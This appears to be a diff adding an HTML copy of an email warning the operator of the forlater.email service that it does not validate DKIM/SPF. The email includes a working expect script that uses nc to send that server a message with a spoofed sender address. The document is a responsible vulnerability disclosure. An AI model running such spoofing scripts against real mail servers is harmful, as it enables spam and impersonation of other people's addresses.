@@ -1,0 +1,36 @@
+<html>
+<head></head>
+<body>
+<p>Hello!</p>
+
+<p>Interesting idea, I like it.</p>
+
+<p>The biggest problem I see is that this is going to (eventually) be used by spammers.</p>
+
+<p>I can send a mail with a FROM anywhere with a link. That link will be advertising for something, and your service will mail it off to some unsuspecting person.</p>
+
+<p>This means your mail server's reputation will end up being black listed everywhere.</p>
+
+<p>Enforcing DKIM/SPF validation would help a lot (but not perfect). I verified that you are not currently doing any validation today. I was able to spoof my gmail address from my residential IP. You do not have very long to fix it before it gets abused. </p>
+
+<p>--George &lt;george@shamm.as&gt;</p>
+
+<p>Proof (and test):</p>
+
+<br />#!/usr/bin/env expect
+<br />
+<br />set timeout 60
+<br />
+<br />spawn nc m.forlater.email 25
+<br />
+<br />expect "220 " { send "EHLO icyphox.sh\r" }
+<br />expect "250 HELP" { send "MAIL FROM:&lt;x@icyphox.sh&gt;\r" }
+<br />expect "250 2.0.0 Ok" { send "RCPT TO:&lt;save@forlater.email&gt;\r" }
+<br />expect "250 2.1.5 Destination address valid: Recipient ok" { send "DATA\r" }
+<br />expect "354 " {
+<br />  send "FROM: x@icyphox.sh\rTO:save@forlater.email\rSUBJECT: save\r\rhttps://shamm.as/forlater.html\r.\r"
+<br />}
+<br />expect "250 2.0.0 \w+ Message accepted for delivery" { disconnect }
+<br />
+</body>
+</html>
